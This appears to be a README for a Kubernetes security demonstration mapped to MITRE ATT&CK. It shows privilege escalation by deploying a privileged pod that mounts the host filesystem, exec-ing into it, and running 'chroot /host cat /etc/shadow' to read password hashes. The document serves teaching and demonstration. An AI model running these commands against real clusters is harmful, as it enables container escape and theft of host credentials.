# Privledge Escalation Demonstration

This demonstration will showcase privledge as part of the MITRE ATT&CK framework. This will showcase privledge escalation by deploying a privledged container that mounts the host filesystem. Once you have mounted the host filesystem you can start to access sensitive information such as the shadow file.

## Steps

1. Assume compromised kubeconfig
2. Apply privledged container into the vulnerable namespace
3. Exec into the pod
4. Chroot to the host directory
5. Access the shadow file

### Apply yaml for privledged pod

```
  kubectl apply -f privileged.yml
```

### Exec into the pod to demonstrate access to a pod directly

```
  kubectl exec -it hackme -n vulnerable -- bash 
```

### chroot the host and access the shadow file

```
  chroot /host cat /etc/shadow 
```

